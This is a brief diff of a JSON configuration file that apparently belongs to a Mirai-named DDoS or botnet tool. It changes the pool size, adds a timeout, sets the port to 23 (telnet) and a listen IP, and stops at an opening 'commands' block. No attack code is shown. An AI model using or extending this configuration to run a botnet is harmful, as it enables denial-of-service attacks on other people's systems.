@@ -1,6 +1,7 @@
 {
-    "pool":3,
+    "pool":2,
     "port": 23,
+    "timeout": 60,
     "ddos_name": "Mirai",
     "ip": "0.0.0.0",
     "commands": {
